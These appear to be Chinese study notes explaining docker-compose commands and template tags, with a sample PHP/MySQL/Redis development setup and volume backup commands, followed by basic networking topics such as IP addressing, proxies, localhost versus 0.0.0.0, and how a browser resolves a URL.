启动已经存在的服务容器

【 stop 】
docker-compose stop [options] [SERVICE...]
停止已经处于运行状态的容器,但不删除它。通过docker-compose start可以再次启动这些容器

选项:
-t, --timeout TIMEOUT 停止容器时候的超时,默认为 10 秒

【 top 】
查看各个服务容器内运行的进程

【 unpause 】
docker-compose unpause [SERVICE...]
恢复处于暂停状态中的服务

【 up 】
docker-compose up [options] [SERVICE...]。
该命令十分强大,它将尝试自动完成包括构建镜像,(重新)创建服务,启动服务,并关联服务相关容器的一系列操作。
链接的服务都将会被自动启动,除非已经处于运行状态。
可以说大部分时候都可以直接通过该命令来启动一个项目。

默认docker-compose up启动的容器都在前台,控制台将会同时打印所有容器的输出信息,可以很方便进行调试。
当通过 Ctrl-C 停止命令时,所有容器将会停止。

如果使用docker-compose up -d将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。

默认如果服务容器已经存在docker-compose up将会尝试停止容器,然后重新创建(保持使用volumes-from挂载的卷),以保证新启动的服务匹配docker-compose.yml文件的最新内容。
如果用户不希望容器被停止并重新创建,可以使用docker-compose up --no-recreate。这样将只会启动处于停止状态的容器,而忽略已经运行的服务
如果用户只想重新部署某个服务,可以使用docker-compose up --no-deps -d SERVICE_NAME 来重新创建服务并后台停止旧服务,启动新服务,并不会影响到其所依赖的服务。

选项:
-d 在后台运行服务容器。
--no-color            不使用颜色来区分不同的服务的控制台输出
--no-deps             不启动服务所链接的容器
--force-recreate      强制重新创建容器,不能与--no-recreate同时使用
--no-recreate         如果容器已经存在了则不重新创建,不能与--force-recreate同时使用
--no-build            不自动构建缺失的服务镜像
-t, --timeout TIMEOUT 停止容器时候的超时,默认为10秒

</pre>

<h4>compose模板文件</h4><pre>
Compose允许用户通过一个docker-compose.yml模板文件(YAML 格式)来定义一组相关联的应用容器为一个项目(project)。
Compose模板文件是一个定义服务、网络和卷的YAML文件。Compose模板文件默认路径是当前目录下的docker-compose.yml,可以使用.yml或.yaml作为文件扩展名。
Docker-Compose标准模板文件应该包含version、services、networks 三大部分,最关键的是services和networks两个部分。

</pre><textarea>version: "3"

services:
  webapp:
    image: examples/web
    ports:
      - "80:80"
    volumes:
      - "/data"

*************************************************
version: '2'

services:
  web:
    build: .
    ports:
     - "5000:5000"
    volumes:
     - .:/code
  redis:
    image: redis

*************************************************
version: '2'
services:
  web:
    image: dockercloud/hello-world
    ports:
      - 8080
    networks:
      - front-tier
      - back-tier

  redis:
    image: redis
    links:
      - web
    networks:
      - back-tier

  lb:
    image: dockercloud/haproxy
    ports:
      - 80:80
    links:
      - web
    networks:
      - front-tier
      - back-tier
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock

networks:
  front-tier:
    driver: bridge
  back-tier:
driver: bridge

*************************************************
</textarea><pre>
每个服务都必须通过image指令指定镜像或build指令(需要Dockerfile)等来自动构建生成镜像。
如果使用build指令,在Dockerfile中设置的选项(例如:CMD, EXPOSE, VOLUME, ENV 等) 将会自动被获取,无需在docker-compose.yml中再次设置

【 build标签 】
服务除了可以基于指定的镜像,还可以基于一份Dockerfile,在使用up启动之时执行构建任务,这个构建标签就是build
指定Dockerfile所在文件夹的路径,可以是绝对路径或相对docker-compose.yml文件的路径,Compose将会利用它自动构建这个镜像然后使用这个镜像启动服务容器
build: /path/to/build/dir

也可以是相对路径,只要上下文确定就可以读取到Dockerfile。
build: ./dir

也可以使用context指令指定Dockerfile所在文件夹的路径,使用dockerfile指令指定Dockerfile文件名,使用arg指令指定构建镜像过程中指定环境变量,但在构建成功后取消
build都是一个目录,如果要指定Dockerfile文件需要在build标签的子级标签中使用dockerfile标签指定

webapp:
  build:
    context: ./dir
    dockerfile: Dockerfile-alternate
    args:
      buildno: 1
      password: secret

或者
build:
  context: .
  args:
    - buildno=1
    - password=secret

与ENV不同的是,ARG是允许空值的,这样构建过程可以向它们赋值
args:
  - buildno
  - password

使用cache_from指定构建镜像的缓存

build:
  context: .
  cache_from:
    - alpine:latest
    - corp/web_app:3.14

如果同时指定image和build两个标签,那么Compose会构建镜像并且把镜像命名为image后面的那个名字。
build: ./dir
image: webapp:tag

【 image标签 】
指定为镜像名称或镜像ID。如果镜像在本地不存在,Compose将会尝试拉取这个镜像。
image: redis
image: ubuntu:14.04
image: tutum/influxdb
image: example-registry.com:4000/postgresql
image: a4bc65fd

【 command标签 】
覆盖容器启动后默认执行的命令
command: echo "hello world"
command: ["echo", "hello world"]

【 container_name标签 】
指定容器名称,默认将会使用 <项目名称><服务名称><序号> 的格式。
虽然可以自定义项目名称、服务名称,但如果想完全控制容器的命名可以使用这个标签指定:
container_name: docker-web-container
指定容器名称后,该服务将无法进行扩展(scale),因为Docker不允许多个容器具有相同的名称

【 depends_on标签 】
在使用Compose时最大的好处就是少打启动命令,但一般项目容器启动的顺序是有要求的,如果直接从上到下启动容器必然会因为容器依赖问题而启动失败。
例如在没启动数据库容器的时候启动了应用容器,这时候应用容器会因为找不到数据库而退出,为了避免这种情况需要加入depends_on标签,这个标签解决了容器的依赖、启动先后的问题。

以下例子先启动redis db再启动web,web服务不会等待redis db完全启动之后才启动
默认使用docker-compose up web这样的方式启动web服务时,也会启动redis和db两个服务,因为在配置文件中定义了依赖关系

version: '3'
services:
  web:
    build: .
    depends_on:
      - db
      - redis
  redis:
    image: redis
  db:
    image: postgres

【 env_file标签 】
从文件中获取环境变量,可以为单独的文件路径或列表。
在docker-compose.yml中可以定义一个专门存放变量的文件
如果通过docker-compose -f FILE方式来指定Compose模板文件,则env_file中变量的路径会基于模板文件路径。
如果有变量名称与environment指令冲突则按照惯例以后者为准

env_file: .env

env_file:
  - ./common.env
  - ./apps/web.env
  - /opt/secrets.env

环境变量文件中每一行必须符合格式,支持 # 开头的注释行。
# common.env: Set development environment
PROG_ENV=development

这里所说的环境变量是对宿主机的Compose而言的,如果在配置文件中有build操作,这些变量并不会进入构建过程中,如果要在构建中使用变量还是首选arg标签

【 environment标签 】
与env_file标签完全不同,反而和arg有几分类似,这个标签的作用是设置镜像变量,它可以保存变量到镜像里面,也就是说启动的容器也会包含这些变量设置,这是与arg最大的不同。
一般arg标签的变量仅用在构建过程中,而environment和Dockerfile中的ENV指令一样会把变量一直保存在镜像、容器中,类似docker run -e的效果

可以使用数组或字典两种格式。
只给定名称的变量会自动获取运行Compose主机上对应变量的值,可以用来防止泄露不必要的数据。

environment:
  RACK_ENV: development
  SESSION_SECRET:

environment:
  - RACK_ENV=development
  - SESSION_SECRET

YAML的布尔值(true, false, yes, no, on, off)必须要使用引号引起来(单引号、双引号均可),否则会当成字符串解析
如果变量名称或值中用到true|false,yes|no等表达布尔含义的词汇,最好放到引号里,避免YAML自动解析某些内容为对应的布尔语义。这些特定词汇,包括
y|Y|yes|Yes|YES|n|N|no|No|NO|true|True|TRUE|false|False|FALSE|on|On|ON|off|Off|OFF

【 获取变量 】
Compose模板文件支持动态读取主机的系统环境变量和当前目录下的.env文件中的变量。

# 下面的Compose文件将从运行它的环境中读取变量 ${MONGO_VERSION} 的值并写入执行的指令中
version: "3"
services:
  db:
  image: "mongo:${MONGO_VERSION}"

如果执行 MONGO_VERSION=3.2 docker-compose up 则会启动一个 mongo:3.2 镜像的容器

在当前目录中有.env 文件
# 支持 # 号注释
MONGO_VERSION=3.6
执行 docker-compose up 则会启动一个 mongo:3.6 镜像的容器。

【 secrets标签 】
存储敏感数据,例如mysql服务密码

mysql:
  image: mysql
  environment:
    MYSQL_ROOT_PASSWORD_FILE: /run/secrets/db_root_password
  secrets:
    - db_root_password
    - my_other_secret

secrets:
  my_secret:
    file: ./my_secret.txt
  my_other_secret:
    external: true

【 labels标签 】
为容器添加Docker元数据(metadata)信息,和Dockerfile的LABEL指令一个意思,例如可以为容器添加辅助说明信息。

labels:
  com.example.description: "Accounting webapp"
  com.example.department: "Finance"
  com.example.label-with-empty-value: ""
labels:
  - "com.example.description=Accounting webapp"
  - "com.example.department=Finance"
  - "com.example.label-with-empty-value"

【 logging标签 】
配置日志服务

logging:
  driver: syslog
  options:
    syslog-address: "tcp://192.168.0.42:123"

目前支持三种日志驱动类型。
driver: "json-file",默认
driver: "syslog"
driver: "none"

只有json-file和journald可以通过docker-compose logs显示日志,其他方式有其他日志查看方式

options配置日志驱动的相关参数。
options:
  max-size: "200k"
  max-file: "10"

【 network_mode标签 】
设置网络模式,可以指定使用服务或容器的网络
使用和 docker run 的 --network 参数一样的值,只是相对多了一个service:[service name] 的格式

network_mode: "bridge"
network_mode: "host"
network_mode: "none"
network_mode: "service:[service name]"
network_mode: "container:[container name/id]"

【 networks标签 】
配置容器连接的网络,加入指定网络

services:
  some-service:
    networks:
     - some-network
     - other-network

networks:
  some-network:
  other-network:

关于这个标签还有一个特别的子标签aliases,这是一个用来设置服务别名的标签,相同的服务可以在不同的网络有不同的别名。
services:
  some-service:
    networks:
      some-network:
        aliases:
         - alias1
         - alias3
      other-network:
        aliases:
         - alias2

【 pid标签 】
跟主机系统共享进程命名空间。打开该选项的容器之间及容器和宿主机系统之间可以通过进程ID来相互访问和操作。
将PID模式设置为主机PID模式,跟主机系统共享进程命名空间。容器使用这个标签将能够访问和操纵其他容器和宿主机的名称空间
pid: "host"

【 ports标签 】
映射端口的标签
使用宿主端口:容器端口(HOST:CONTAINER)格式,或只指定容器的端口(宿主将会随机选择映射端口)都可以。

当使用HOST:CONTAINER格式来映射端口时,如果使用的容器端口小于60并且没放到引号里,可能会得到错误结果,因为YAML会自动解析xx:yy这种数字格式为60进制。为避免出现这种问题,建议数字串都采用引号包括起来的字符串格式。

ports:
 - "3000"
 - "8000:8000"
 - "49100:22"
 - "127.0.0.1:8001:8001"

【 expose标签 】
与Dockerfile中的EXPOSE指令一样,指定暴露的端口,但不映射到宿主机,只被连接的服务访问。
但只是作为一种参考,实际上docker-compose.yml的端口映射还得ports这样的标签

expose:
 - "3000"
 - "8000"

【 volumes标签 】
数据卷所挂载路径设置,可以设置宿主机路径(HOST:CONTAINER) 或加上访问模式(HOST:CONTAINER:ro)
该指令中路径支持相对路径。

volumes:
 - /var/lib/mysql
 - cache/:/tmp/cache
 - ~/configs:/etc/configs/:ro

挂载一个目录或一个已存在的数据卷容器,可以直接使用HOST:CONTAINER这样的格式,或使用HOST:CONTAINER:ro这样的格式,后者对于容器来说数据卷是只读的,这样可以有效保护宿主机的文件系统。

Compose的数据卷指定路径可以是相对路径,使用 . 或 .. 来指定相对目录。

数据卷的格式可以是下面多种形式:
volumes:
  - /var/lib/mysql              // 只是指定一个路径,Docker会自动在容器内部创建一个数据卷
  - /opt/data:/var/lib/mysql    // 使用绝对路径挂载数据卷
  - ./cache:/tmp/cache          // 以Compose配置文件为中心的相对路径作为数据卷挂载到容器
  - ~/configs:/etc/configs/:ro  // 使用用户的相对路径(~/ 表示的目录是 /home/<用户目录>/ 或者 /root/)
  - datavolume:/var/lib/mysql   // 已经存在的命名的数据卷

如果不使用宿主机的路径,可以指定一个volume_driver。
volume_driver: mydriver

【 volumes_from标签 】
从其它容器或服务挂载数据卷,可选的参数是:ro或:rw,前者表示容器只读,后者表示容器对数据卷是可读可写的,默认可读可写

volumes_from:
  - service_name
  - service_name:ro
  - container:container_name
  - container:container_name:rw

【 tmpfs标签 】
挂载一个临时目录(tmpfs文件系统)到容器内部,与run的参数一样的效果

tmpfs: /run
tmpfs:
  - /run
  - /tmp

【 devices标签 】
指定设备映射关系,与Docker client的--device参数类似

devices:
  - "/dev/ttyUSB1:/dev/ttyUSB0"

【 entrypoint标签 】
指定服务容器启动后执行的入口文件,覆盖Dockerfile中的定义
entrypoint: /code/entrypoint.sh

格式和Docker类似,不过还可以写成这样:
entrypoint:
  - php
  - -d
  - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so
  - -d
  - memory_limit=-1
  - vendor/bin/phpunit

【 user标签 】
指定容器中运行应用的用户名。
user: nginx

【 working_dir标签 】
指定容器中工作目录。
working_dir: /code

【 domainname标签、hostname标签、mac_address标签 】
指定容器中搜索域名、主机名、mac地址等。
domainname: your_website.com
hostname: test
mac_address: 08-00-27-00-0C-0A

【 privileged标签 】
允许容器中运行一些特权命令。
privileged: true

【 restart标签 】
指定容器退出后的重启策略为始终重启。该命令对保持服务始终运行十分有效,在生产环境中推荐配置为always或unless-stopped。
restart: always

【 read_only标签 】
以只读模式挂载容器的root文件系统,意味着不能对容器内容进行修改。
read_only: true

【 stdin_open标签 】
打开标准输入,可以接受外部输入。
stdin_open: true

【 ty标签 】
模拟一个伪终端。
tty: true

【 top_signal标签 】
设置另一个信号来停止容器,在默认情况下使用的是SIGTERM停止容器
stop_signal: SIGUSR1

【 ns标签 】
和--dns参数一样用途,自定义DNS服务器。可以是一个值或列表。
dns: 8.8.8.8

dns:
  - 8.8.8.8
  - 114.114.114.114

【 ns_search标签 】
配置DNS搜索域。可以是一个值或列表。

dns_search: example.com

dns_search:
  - domain1.example.com
  - domain2.example.com

【 ealthcheck标签 】
通过命令检查容器是否健康运行。

healthcheck:
  test: ["CMD", "curl", "-f", "http://localhost"]
  interval: 1m30s
  timeout: 10s
  retries: 3

【 xtends标签 】
这个标签可以扩展另一个服务,扩展内容可以是来自在当前文件或其他文件,相同服务的情况下后来者会有选择地覆盖原有配置

extends:
  file: common.yml
  service: webapp

用户可以在任何地方使用这个标签,只要标签内容包含file和service两个值就可以了。file的值可以是相对或绝对路径,如果不指定file的值,那么Compose会读取当前YML文件的信息。

【 onfigs标签 】
仅用于Swarm mode

【 eploy标签 】
仅用于Swarm mode

【 ap_add, cap_drop标签 】
指定容器的内核能力capacity分配,添加或删除容器的内核功能

让容器拥有所有能力可以指定为:
cap_add:
  - ALL

去掉NET_ADMIN能力可以指定为:
cap_drop:
  - NET_ADMIN

【 cgroup_parent标签 】
指定一个容器的父级cgroup,指定父cgroup组,意味着将继承该组的资源限制。

创建了一个 cgroup 组名称为 cgroups_1。
cgroup_parent: cgroups_1

【links标签】
注意:不推荐使用该指令。
depends_on标签解决的是启动顺序问题,links标签解决的是容器连接问题,与Docker client的--link一样效果,会连接到其它服务中的容器

links:
 - db
 - db:database
 - redis

使用的别名将会自动在服务容器中的/etc/hosts里创建。例如:
172.12.2.186  db
172.12.2.186  database
172.12.2.187  redis

相应的环境变量也将被创建。

【external_links标签】
注意:不建议使用该指令。
链接到 docker-compose.yml 外部的容器,甚至并非 Compose 管理的外部容器。

在使用Docker过程中会有许多单独使用docker run启动的容器,为了使Compose能够连接这些不在docker-compose.yml中定义的容器,需要一个特殊的标签external_links,它可以让Compose项目里面的容器连接到那些项目配置外部的容器,前提是外部容器中必须至少有一个容器是连接到与项目内的服务的同一个网络里面

external_links:
 - redis_1
 - project_db_1:mysql
 - project_db_1:postgresql

【 xtra_hosts标 】
添加主机名的标签,就是往/etc/hosts文件中添加一些记录,类似Docker中的--add-host参数,指定额外的host名称映射信息。

extra_hosts:
 - "googledns:8.8.8.8"
 - "dockerhub:52.1.157.61"

会在启动后的服务容器中/etc/hosts 文件中添加如下两条条目。
8.8.8.8 googledns
52.1.157.61 dockerhub

【 ecurity_opt标 】
为每个容器覆盖默认的标签。简单说来就是管理全部服务的标签。比如设置全部服务的user标签值为USER
指定容器模板标签(label)机制的默认属性(用户、角色、类型、级别等)。例如配置标签的用户名和角色名。
security_opt:
  - label:user:USER
  - label:role:ROLE

【 ysctls标 】
配置容器内核参数。

sysctls:
  net.core.somaxconn: 1024
  net.ipv4.tcp_syncookies: 0

sysctls:
  - net.core.somaxconn=1024
  - net.ipv4.tcp_syncookies=0

【 limits标 】
指定容器的 ulimits 限制值
例如,指定最大进程数为 65535,指定文件句柄数为 20000(软限制,应用可以随时修改,不能超过硬限制) 和 40000(系统硬限制,只能 root 用户提高)。

ulimits:
  nproc: 65535
  nofile:
    soft: 20000
    hard: 40000

</pre>

<h4>docker-compose实例</h4><pre>
获取Docker Compose配置文件
以ThinkPHP 3.2自用开发环境为例,对应的组件为Nginx1.12 + PHP5.3.29(php-fpm) + MySQL5.6.36 + Redis 3.0。
首先创建docker-dev目录,然在该目录中创建docker-compose.yml文件:

version: "3"
services:
  nginx:
    image: nginx:1.12-alpine
    container_name: tp3-nginx
    ports:
      - "80:80"
    networks:
      - dockerinnernet
    depends_on:
      - "php"
    volumes:
      - ~/docker_data/nginx:/etc/nginx/conf.d
      - ~/docker_data/wwwroot:/var/www/html:ro
  php:
    image: surenkid/php53:latest
    container_name: tp3-php
    ports:
      - "9000:9000"
    networks:
      - dockerinnernet
    depends_on:
      - "mysql"
      - "redis"
    volumes:
      - ~/docker_data/wwwroot:/var/www/html
  mysql:
    image: mysql:5.6.36
    container_name: tp3-mysql
    ports:
      - "3306:3306"
    networks:
      - dockerinnernet
    volumes:
      - mydata:/var/lib/mysql
      - ~/docker_data/dbdump:/root
    environment:
      MYSQL_ROOT_PASSWORD: "123456"
  redis:
    image: redis:3.0-alpine
    container_name: tp3-redis
    ports:
      - "6379:6379"
    networks:
      - dockerinnernet
    volumes:
      - ~/docker_data/redis:/data
networks:
  dockerinnernet:
volumes:
  mydata:

运行Docker环境
打开终端在命令行中执行:
docker-compose up
Docker会自动根据配置运行对应找到需要的镜像开始创建容器,等待下载并运行完成后,基本的开发环境就已经搭建成功
如果打算开始一个新的项目,现在就可以在我的用户文件夹中,进入docker_data/wwwroot文件夹开始编码

这里由于已经把nginx的配置文件目录暴露到本地,因此需要在本地~/docker_data/nginx目录中新建一个default.conf的nginx配置文件,文件内容如下:
server {
  listen       80;
  server_name  localhost;
  location / {
    root   /var/www/html;
    index  index.html index.htm;
  }
  location ~ \.php$ {
    root           /var/www/html;
    fastcgi_pass   php:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
  }
}
之后使用docker-compose命令重启docker项目即可。

【 备份还原docker环境中的开发数据 】
如果之前在其他机器中的docker环境中就有一个开发中的项目,现在需要把以前的数据导入继续开发,那么就需要继续下面的步骤。

备份开发数据
参考官方的说明,使用ubuntu镜像来打包备份其中的数据,首先创建一个一次性ubuntu镜像实例,将/root目录映射到本地磁盘,然后在镜像中将对应的数据备份到映射的路径(即 /root),之后就可以在本地磁盘中看到备份的数据文件。备份命令格式:
docker run -rm --volumes-from 需要备份的实例 -v $(pwd):/root ubuntu bash -c "cd /需要备份的数据目录 && tar cvzf /root/备份.tar.gz *"
如:
docker run --rm --volumes-from zf2-mysql -v $(pwd):/root ubuntu bash -c "cd /var/lib/mysql && tar cvzf /root/mysql.tar.gz *"

如果平台为当前宿主主机的操作系统是 Windows,需要将其中的$(pwd)改为%cd%。

还原开发数据
恢复备份数据到docker实例则刚好相反,恢复时最好将实例停止,防止出现数据冲突。恢复命令格式:
docker run --rm --volumes-from 需要恢复的实例 -v $(pwd):/root ubuntu bash -c "cd /需要还原数据的目录 && tar xvzf /root/备份.tar.gz"
例如:
docker run --rm --volumes-from zf2-mysql -v $(pwd):/root ubuntu bash -c "cd /var/lib/mysql && tar xvzf /root/mysql.tar.gz"

</pre>
</div>

<div id="http">
<h2>http协议</h2>
<h3>网络</h3><pre>
TCP/IP 是针对因特网的通信协议
TCP(传输控制协议) - 应用程序之间通信。使用固定的来接,占用通信线路
UDP(用户数据包协议) - 应用程序之间的简单通信
IP(网际协议) - 计算机之间的通信,是无连接的通信协议
ICMP(因特网消息控制协议) - 针对错误和状态
DHCP(动态主机配置协议) - 针对动态寻址

Ip使用4个0-255之间的数字来为计算机编码

URIs, URLs, and URNs
URI是uniform resource identifier,统一资源标识符,用来唯一的标识一个资源
URL是uniform resource locator,统一资源定位器,一种具体的URI,可用来标识一个资源,还指明如何locate这个资源
URN是uniform resource name,统一资源命名,是通过名字来标识资源,比如mailto:java-net@java.sun.com
URI是以一种抽象的,高层次概念定义统一资源标识,而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI
URI可以分为URL,URN或同时具备locators 和names特性的一个东西。URN作用就好像一个人的名字,URL就像一个人的地址。换句话说:URN确定了东西的身份,URL提供了找到它的方式

获取本机的外网ip(http://ip.3322.org/)
百度
站长之家
网络连接
cmd-ipconfig  ipconfig -all
$_SERVER["REMOTE_ADDR"]

DNS 服务器负责将域名翻译为TCP/IP 地址,同时负责使用新的域名信息更新彼此的系统

HTTP 负责web服务器与web浏览器之间的通信,是基于TCP/IP协议的应用层协议。明文传输,默认端口80

https是http协议下加入ssl/tls,需要到CA申请证书,默认端口443
作用:
1.内容加密传输,安全性
2.身份认证
3.数据完整性:不被抓包工具抓取

代理服务器(Proxy Server)起到防火墙的作用,大多被用来连接Internet和local area network(局域网)
一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全,防止攻击
连接到目标服务器拥挤或者故障时可以通过代理访问
突破自身IP访问限制,可以通过代理访问国外站点
可以通过这种方法隐藏自己的IP,免受攻击
代理分类:
1.http代理:www连接请求采用的http协议,如浏览网页,下载数据(也可采用ftp协议),通常绑定在代理服务器的80、3128、8080等端口上
2.socks代理:Socks是个电路级的底层网关,采用socks协议的代理服务器就是SOCKS服务器
3.vpn代理:虚拟专用网络,在共用网络上建立专用网络的技术
  之所以称为虚拟网主要是因为整个VPN网络的任意两个结点之间的连接并没有传统专网建设所需的点到点的物理链路,
  而是架构在公用网络服务商ISP所提供的网络平台之上的逻辑网络
  用户的数据是通过ISP在公共网络(Internet)中建立的逻辑隧道(Tunnel),即点到点的虚拟专线进行传输的
  通过相应的加密和认证技术来保证用户内部网络数据在公网上安全传输,从而真正实现网络数据的专有性
4.反向代理服务器架设在服务器端,通过缓冲经常被请求的页面来缓解服务器的工作量
  加密和ssl加速  负载均衡  缓存静态内容 压缩减速上传  安全外网发布
5.FTP代理
6.pop3代理

非对称加密技术:加密使用公开的"公钥"密钥,解密使用私有的"私钥"密钥

网络连接速度即带宽    bandwidth     bps或b/s

VPS(Virtual Private Server 虚拟专用服务器)技术,将一部服务器分割成多个虚拟专享服务器的优质服务
每个VPS都可分配独立的公网IP地址、操作系统、超大空间、内存、CPU资源、执行程序和系统配置等
用户除了可以分配多个虚拟主机及无限企业邮箱外,更具有独立服务器功能,可自行安装程序,单独重启服务器

虚拟主机,也叫"网站空间",就是把一台运行在互联网上的服务器划分成多个"虚拟"的服务器,
每一个虚拟主机都具有独立的域名和完整的Internet服务器(支持WWW、FTP、E-mail等)功能

URL   Uniform Resource Locator
http  超文本传输协议hyper text transfer protocol,以http:// 开头的普通网页。不加密
https 安全超文本传输协议 安全网页。加密所有信息交换
ftp   文件传输协议  用于将文件下载或上传至网站
file  您计算机上的文件
DOS   磁盘操作系统Disk Operating System
*     多字通配符
？    单字通配符
.bat  批处理文件
.dll  动态链接库,往往由EXE或com文件调用
.bak  备份文件

百度地图地理定位http://api.map.baidu.com/lbsapi/creatmap/

</pre>

<h4>localhost和127.0.0.1</h4><pre>
localhost是一个域名,在过去它指向127.0.0.1这个IP地址。在操作系统支持ipv6后还指向ipv6的地址[::1]
在Windows中这个域名是预定义的,从hosts文件中可以看出
而在 Linux 中,其定义位于 /etc/hosts 中

这个值是可修改的,比如我把它改成
192.068.206.1    localhost
然后再去 ping localhost,提示就变成了
PING localhost(192.168.206.1) 56(84) bytes of data.

127.0.0.1 这个地址通常分配给loopback接口。loopback是一个特殊的网络接口(可理解成虚拟网卡),用于本机中各个应用之间的网络交互。只要操作系统的网络组件是正常的,loopback就能工作。Windows 中看不到这个接口,Linux中这个接口叫lo:
#ifconfig
eth0    Link encap:Ethernet hwaddr 00:00:00:00:00:00
        inet addr :192.168.0.1 Bcase:192.168.0.255 Mask:255.255.255.0
        ......
lo      Link encap:Local Loopback
        inetaddr: 127.0.0.1 Mask: 255.0.0.0
        ......
可以看出lo接口的地址是127.0.0.1。事实上整个127.* 网段都算能够使用,比如ping 127.0.0.2也是通的。但是使用127.0.0.1作为loopback接口的默认地址只是一个惯例

本机地址通常指的是绑定在物理或虚拟网络接口上的IP地址,可供其他设备访问到

localhost:本地服务器
127.0.0.1:在windows等系统的正确解释是:本机地址(本机服务器)
localhot:是不经网卡传输的,它不受网络防火墙和网卡相关的的限制。
127.0.0.1:是通过网卡传输的,它依赖网卡,并受到网络防火墙和网卡相关的限制
一般设置程序时本地服务用localhost是最好的,localhost不会解析成IP,也不会占用网卡、网络资源

127.0.0.1和0.0.0.0地址的区别
IP地址的表示
IP地址由两个部分组成,net-id和host-id,即ip地址所在的网络号和ip地址所在网络中的某个主机号码。
即IP-address ::= {< Network-number>, < Host-number>}

IP地址分类
IP地址一共分为5类即A~E,它们分类的依据是其net-id所占的字节长度以及网络号前几位。
* A类地址:网络号占1个字节,网络号的第一位固定为0。
* B类地址:网络号占2个字节,网络号的前两位固定为10。
* C类地址:网络号占3个字节,网络号的前三位固定位110。
* D类地址:前四位是1110,用于多播(multicast),即一对多通信。
* E类地址:前四位是1111,保留为以后使用。
其中ABC三类地址为单播地址(unicast),用于一对一通信,是最常用的。

特殊IP地址
特殊IP地址就是用来做一些特殊的事情,RFC1700中定义了以下特殊IP地址
1.{0,0}:网络号和主机号都全部为0,表示"本网络上的本主机",只能用作源地址。
2.{0,host-id}:本网络上的某台主机。只能用作源地址。
3.{-1,-1}:表示网络号和主机号的所有位上都是1(二进制),用于本网络上的广播,只能用作目的地址,发到该地址的数据包不能转发到源地址所在网络之外。
4.{net-id,-1}:直接广播到指定的网络上,只能用作目的地址。
5.{net-id,subnet-id,-1}:直接广播到指定网络的指定子网络上,只用作目的地址。
6.{net-id,-1,-1}:直接广播到指定网络的所有子网络上,只能用作目的地址。
7.{127,}:即网络号为127的任意ip地址,都是内部主机回环地址(loopback),永远都不能出现在主机外部的网络中。

127.0.0.1和0.0.0.0地址的区别
共同点:
1、都属于特殊地址。
2、都属于A类地址。
3、都是IPV4地址。

IPV4中0.0.0.0地址被用于表示一个无效的、未知的或不可用的目标。
在服务器中0.0.0.0指本机上的所有IPV4地址,表示监听本机上的所有网卡,如果一个主机有两个IP地址192.168.1.1和10.1.2.1,且该主机上的一个服务监听的地址是0.0.0.0,那么通过两个ip地址都能够访问该服务。
在路由中0.0.0.0表示的是默认路由,即当路由表中没有找到完全匹配的路由的时候所对应的路由。

用途总结:
当一台主机还没有被分配一个IP地址的时候用于表示主机本身。(DHCP分配IP地址的时候)
用作默认路由,表示"任意IPV4主机"。
用来表示目标机器不可用。
用作服务端,表示本机上的任意IPV4地址。

127.0.0.1
127.0.0.1属于{127,}集合中的一个,而所有网络号为127的地址都被称为回环地址,所以回环地址！=127.0.0.1,它们是包含关系,即回环地址包含127.0.0.1
回环地址:所有发往该类地址的数据包都应该被loop back。
用途:
1、回环测试,通过使用ping 127.0.0.1测试某台机器上的网络设备,操作系统或TCP/IP实现是否工作正常。
2、DDos攻击防御:网站收到DDos攻击之后将域名A记录到127.0.0.1,即让攻击者自己攻击自己。
3、大部分Web容器测试的时候绑定的本机地址。

localhost
相比127.0.0.1,localhost具有更多的意义。localhost是个域名,而不是一个ip地址。之所以经常把localhost与127.0.0.1认为是同一个是因为大多数电脑上都将localhost指向了127.0.0.1这个地址。
在ubuntu系统中/ets/hosts文件中都会有如下内容:
127.0.0.1   localhost
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
上面第一行是几乎每台电脑上都会有的默认配置,但是localhost的意义并不局限于127.0.0.1。
localhost用于指代this computer或this host,可用来获取运行在本机上的网络服务,大多数系统中localhost被指向了IPV4的127.0.0.1和IPV6的::1。

127.0.0.1    localhost
::1          localhost
所以在使用的时候要注意确认IPV4还是IPV6

总结
127.0.0.1是一个环回地址,并不表示"本机",0.0.0.0才是真正表示本网络中的本机
在实际应用中一般在服务端绑定端口的时候可以选择绑定到0.0.0.0,这样服务访问方就可以通过多个ip地址访问服务。
比如我有一台服务器,一个外放地址A,一个内网地址B,如果绑定的端口指定了0.0.0.0,那么通过内网地址或外网地址都可以访问我的应用。但是如果我之绑定了内网地址,那么通过外网地址就不能访问。所以如果绑定0.0.0.0,也有一定安全隐患,对于只需要内网访问的服务,可以只绑定内网地址。

</pre>

<h4>浏览器搜索过程</h4><pre>
第一步:浏览器检查url格式是否正确
若输入的url格式或协议不正确,那么浏览器会将地址栏中输入的文字传给默认的搜索引擎搜索,同时浏览器会在url后面加上一段特殊的字符,表示搜索来自特定的浏览器。

如果输入的是正确的url,那么浏览器在发出http链接请求之前会先检查自己的预加载HSTS(http严格传输安全)列表,这个列表里面记录了哪些网站是需要https连接的。

根据这张列表,浏览器就向需要https连接的网站发送https请求。而不在这张表内的,浏览器就发送http请求。不过现在都鼓励用更安全的https链接,而且支持用https链接访问的网站,在搜索引擎中的排名都会靠前。

但有的网站支持https连接,可是却不在这张表中,那么浏览器第一次发送的访问请求还是http,这样若是攻击者抓住这第一次的访问请求,劫持了用户,那么后面的访问就都GG了。看攻击者怎么利用这次成功的劫持了。有个攻击专门针对这个缺陷的叫downgrade attack降级攻击。

第二步:DNS域名解析地址解析查询
若上面的url没问题,HSTS也查询了,知道用http去访问还是https去访问了,那么下面就是找真正的域名IP了,只有知道IP才能利用路由到达目的地。

在地址栏输入的域名并不是最后资源所在的真实位置,域名只是与IP地址的一个映射。网络服务器的IP地址那么多,不可能去记一串串的数字,因此域名就产生了,域名解析的过程实际是将域名还原为IP地址的过程。

DNS域名解析有两种方法:迭代查询和递归查询

首先看浏览器自己的DNS缓存表,里面有对应的域名IP关系,浏览器自己根据这张表去找目的地址。若是浏览器访问的域名不在这张缓存表中,那么浏览器就会调用某个函数(gethostbyname库函数)进行查询,先看域名能否在本地HOST找到,若在缓存中和本地都找不到,那就向DNS服务器发送请求。

